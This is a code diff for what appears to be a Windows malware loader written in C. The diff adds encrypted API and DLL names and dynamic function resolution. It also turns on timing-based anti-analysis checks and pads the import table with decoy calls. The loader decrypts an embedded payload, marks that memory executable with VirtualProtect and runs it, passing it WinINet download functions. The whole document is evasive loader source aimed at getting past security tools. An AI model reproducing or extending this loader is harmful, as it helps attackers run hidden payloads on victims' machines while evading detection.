@@ -1,6 +1,6 @@
 #include "loader.h"
 #include "payload_enc.c"
-// #include "entropy_low.c"
+#include "entropy_low.c"
 
 
 
@@ -21,19 +21,10 @@ void DBGLG(char buf[], ...){
 }
 
 
-/*
-    args = {
-        InternetOpen,
-        InternetOpenUrlA,
-        InternetReadFile,
-        InternetCloseHandle,
-        unsigned char* buf,
-        int* sz,
-        stepOverExit
-    }
-*/
 // unsigned long long args[] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, NULL, NULL, stepOverExit};
 unsigned long long args[] = {NULL, NULL, NULL, NULL, NULL, NULL, stepOverExit};
+
+
 // unsigned char cMessageBoxW[] = "MessageBoxW";
 unsigned char cMessageBoxW[] = {168, 129, 221, 24, 74, 113, 150, 47, 30, 79, 118, 101, 42, 90, 128, 97};
 // unsigned char cVirtualProtect[] = "VirtualProtect";
@@ -67,6 +58,24 @@ unsigned char cCloseDesktop[] = {126, 203, 216, 60, 164, 173, 199, 48, 69, 66, 1
 // unsigned char cExitProcess[] = "ExitProcess";
 unsigned char cExitProcess[] = {229, 169, 105, 183, 183, 207, 79, 143, 91, 28, 190, 96, 176, 180, 3, 250};
 
+unsigned char cRtlExitUserProcess[] = {78, 101, 15, 20, 26, 62, 203, 237, 3, 53, 16, 222, 165, 62, 36, 89, 124, 51, 30, 175, 49, 120, 213, 212, 246, 159, 137, 192, 173, 83, 145, 0};
+// unsigned char cLdrLoadDll[] = "LdrLoadDll";
+unsigned char cLdrLoadDll[] = {49, 228, 28, 71, 6, 45, 100, 249, 227, 19, 214, 164, 11, 101, 189, 4};
+
+// unsigned char cRtlInitUnicodeString[] = "RtlInitUnicodeString";
+unsigned char cRtlInitUnicodeString[] = {109, 184, 147, 225, 133, 173, 34, 117, 184, 100, 240, 44, 5, 198, 206, 132, 248, 181, 148, 87, 90, 161, 186, 250, 26, 95, 146, 175, 39, 108, 125, 167};
+
+// unsigned short sKernelbase[] = L"kernelbase.dll";
+unsigned char sKernelbase[] = {199, 147, 34, 232, 195, 9, 37, 179, 147, 55, 218, 145, 221, 41, 18, 137, 93, 82, 87, 171, 212, 20, 124, 206, 207, 141, 41, 22, 222, 127, 188, 44};
+// unsigned short sWininet[] =L"wininet.dll";
+unsigned char sWininet[] = {17, 27, 148, 101, 114, 136, 28, 15, 27, 155, 27, 122, 141, 214, 221, 211, 164, 45, 74, 3, 172, 195, 110, 115, 90, 101, 184, 123, 169, 85, 215, 156};
+// unsigned short sUser32[] = L"user32.dll";
+unsigned char sUser32[] = {205, 212, 38, 16, 97, 187, 229, 248, 29, 163, 209, 9, 192, 87, 4, 109, 246, 31, 198, 87, 10, 76, 51, 25, 142, 185, 30, 1, 222, 98, 203, 210};
+// unsigned short sNtdll[] = L"ntdll.dll";
+unsigned char sNtdll[] = {107, 1, 99, 198, 207, 23, 147, 227, 71, 117, 113, 11, 110, 218, 96, 212, 116, 200, 22, 181, 218, 196, 123, 19, 106, 154, 216, 114, 253, 122, 41, 225};
+
+// unsigned short ntdll_char[] = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
+unsigned char ntdll_full_path[] = {185, 19, 197, 214, 49, 66, 211, 67, 202, 166, 31, 14, 142, 157, 214, 242, 247, 221, 241, 155, 254, 135, 58, 254, 250, 39, 119, 119, 156, 230, 92, 83, 204, 76, 191, 100, 103, 159, 68, 45, 82, 196, 222, 169,178, 221, 165, 222, 98, 187, 12, 224, 251, 92, 155, 29, 252, 4, 12, 134, 58, 76, 217, 228};
 
 
 HMODULE Kernel32Module;
@@ -95,6 +104,7 @@ volatile int mutex_setupWinApi = 0;
 HDESK desktop;
 
 DWORD WINAPI setupWinApi(){
+    // DYNAMIC_RETURN;
     int x = 1;
     int y = 187;
     while (mutex_setupWinApi != 1){
@@ -102,20 +112,19 @@ DWORD WINAPI setupWinApi(){
         y = x * x;
     }
     _SetThreadDesktop(desktop);
-    // DYNAMIC_RETURN;
     _MessageBoxW = (MessageBoxWFunc)(_GetProcAddress(user32Module, cMessageBoxW));
     _CloseDesktop = (pCloseDesktop)_GetProcAddress(user32Module, cCloseDesktop);
     _VirtualProtect = (pVirtualProtect)_GetProcAddress(Kernel32Module, cVirtualProtect);
     _CreateFileW = (pCreateFileW)_GetProcAddress(Kernel32Module, cCreateFileW);
     _WriteFile = (pWriteFile)_GetProcAddress(Kernel32Module, cWriteFile);
+    // DYNAMIC_RETURN;
     _CloseHandle = (pCloseHandle)_GetProcAddress(Kernel32Module, cCloseHandle);
     _InternetOpen = (pInternetOpenW)_GetProcAddress(WininetModule, cInternetOpenW);
     _InternetOpenUrlA = (pInternetOpenUrlA)_GetProcAddress(WininetModule, cInternetOpenUrlA);
     _InternetReadFile = (pInternetReadFile)_GetProcAddress(WininetModule, cInternetReadFile);
     _InternetCloseHandle = (pInternetCloseHandle)_GetProcAddress(WininetModule, cInternetCloseHandle);
     _GetLastError = (pGetLastError)_GetProcAddress(Kernel32Module,cGetLastError);
-    _ExitProcess = (pExitProcess)_GetProcAddress(Kernel32Module, cExitProcess);
-    _ExitProcess = (pExitProcess)_GetProcAddress(Kernel32Module, cExitProcess);
+    // _ExitProcess = (pExitProcess)_GetProcAddress(Kernel32Module, cExitProcess);
 
     x = y * x & 4 % 6;
     y = x * x;
@@ -136,19 +145,16 @@ int pseudo_main(){
     unsigned char buf[200 * 1024];
     int x = 58;
     int y = 18;
-    unsigned short sKernelbase[] = L"KernelBase.dll";
-    unsigned short sWininet[] =L"wininet.dll";
-    unsigned short sUser32[] = L"user32.dll";
+
+    #ifndef DEBUG
     TOMFOOLERY
+    #endif
+
     INIT_CONST();
-    Kernel32Module = _LoadLibrary(sKernelbase);
     for (int i = 0; i< 16; ++i){
         MasterKey[i] = i*16 + i;
     }
-    WininetModule = _LoadLibrary(sWininet);
     KeyScheduler(MasterKey, KeyList);
-    user32Module = _LoadLibrary(sUser32);
-
     unsigned long long decryptme[] = {cExitProcess, cCloseDesktop, cMessageBoxW,
                                      cVirtualProtect, cCreateFileW,
                                      cWriteFile, cCloseHandle, cInternetOpenW,
@@ -156,27 +162,36 @@ int pseudo_main(){
                                      cInternetReadFile, cInternetReadFile + 16,
                                      cInternetCloseHandle, cInternetCloseHandle + 16,
                                      cGetLastError, cCreateDisktopW, cSetThreadDesktop,
-                                     cSetThreadDesktop + 16, cCreateThread, cGetSystemTime};
-    for (int i = 0; i < 20; ++i){
+                                     cSetThreadDesktop + 16, cCreateThread, cGetSystemTime,
+                                     cRtlExitUserProcess, cRtlExitUserProcess + 16,
+                                     sKernelbase, sKernelbase + 16, sUser32, sUser32 + 16,
+                                     sWininet, sWininet + 16, sNtdll, sNtdll + 16,
+                                     ntdll_full_path, ntdll_full_path + 16,
+                                     ntdll_full_path + 32, ntdll_full_path + 48,
+                                     cLdrLoadDll, cRtlInitUnicodeString,
+                                     cRtlInitUnicodeString + 16};
+    // FIXME: Change hardcoded i parameter every time you update decryptme
+    for (int i = 0; i < 37; ++i){
         Decrypt(decryptme[i], KeyList);
     }
-
+    Kernel32Module = _LoadLibrary(sKernelbase);
+    WininetModule = _LoadLibrary(sWininet);
+    user32Module = _LoadLibrary(sUser32);
     _CreateThread = (pCreateThread)_GetProcAddress(Kernel32Module, cCreateThread);
     _CreateDesktopW = (pCreateDesktopW)_GetProcAddress(user32Module, cCreateDisktopW);
     _SetThreadDesktop = (pSetThreadDesktop)_GetProcAddress(user32Module, cSetThreadDesktop);
     _GetSystemTime = (pGetSystemTime)_GetProcAddress(Kernel32Module, cGetSystemTime);
+    #ifndef DEBUG
     RECORD_TIME
+    #endif
     if (!_CreateThread){
         unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
-        i = GetLastError();
-        i = SetCriticalSectionSpinCount(NULL, NULL);
-        i = GetWindowContextHelpId(NULL);
-        i = GetWindowLongPtrW(NULL, NULL);
-        i = RegisterClassW(NULL);
-        i = IsWindowVisible(NULL);
-        i = ConvertDefaultLocale(NULL);
-        i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
-        i = IsDialogMessageW(NULL, NULL);
+        i = GdiplusStartup(NULL, NULL, NULL);
+        RegisterClass(NULL);
+        CreateWindowW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        ShowWindow(NULL, NULL);
+        UpdateWindow(NULL);
+        GdiplusShutdown(NULL);
     }
     if ((threadHandle = _CreateThread(NULL, 0, setupWinApi, NULL, 0, &threadId)) == NULL){
         return -89;
@@ -187,7 +202,9 @@ int pseudo_main(){
     mutex_setupWinApi = 1;
     while (mutex_setupWinApi == 1){
         x = y * x & 4 % 6;
-        // CHECK_TIME
+        #ifndef DEBUG
+        CHECK_TIME
+        #endif
         y = x * x ^ 17;
     }
     _CloseHandle(threadHandle);
@@ -203,16 +220,24 @@ int pseudo_main(){
         return 1;
     }
     // RANDOM_BYTE
+    #ifndef DEBUG
     SHORT_JMP
+    #endif
     memcpy(execute_me, payload_enc_bytes, sizeof(payload_enc_bytes));
     for (int i = 0; i < sizeof(payload_enc_bytes); i += 16){
         Decrypt(execute_me + i, KeyList);
     }
+    #ifndef DEBUG
     CHECK_TIME
+    #endif
     _VirtualProtect(execute_me, sizeof(payload_enc_bytes),PAGE_EXECUTE_READWRITE, &junk);
-    // CHECK_TIME
+    #ifndef DEBUG
+    CHECK_TIME
+    #endif
     p = (payload)(execute_me);
-    // CHECK_TIME
+    #ifndef DEBUG
+    CHECK_TIME
+    #endif
     p(args);
     DWORD bytesWritten;
     BOOL result = _WriteFile(hFile, buf, (DWORD)sz, &bytesWritten, NULL);
@@ -221,12 +246,17 @@ int pseudo_main(){
         return 1;
     }
     _CloseHandle(hFile);
+    #ifdef DEBUG
     _MessageBoxW(NULL, L"OK", L"OK", MB_OK);
+    #endif
     return x + y;
 }
 
 void WinMainCRTStartup(){
-    DYNAMIC_RETURN;
+    // DYNAMIC_RETURN;
     pseudo_main();
+    HMODULE NtdllModule = _LoadLibrary(sNtdll);
+    _ExitProcess = _GetProcAddress(NtdllModule, cRtlExitUserProcess);
     _ExitProcess(0);
+    return;
 }
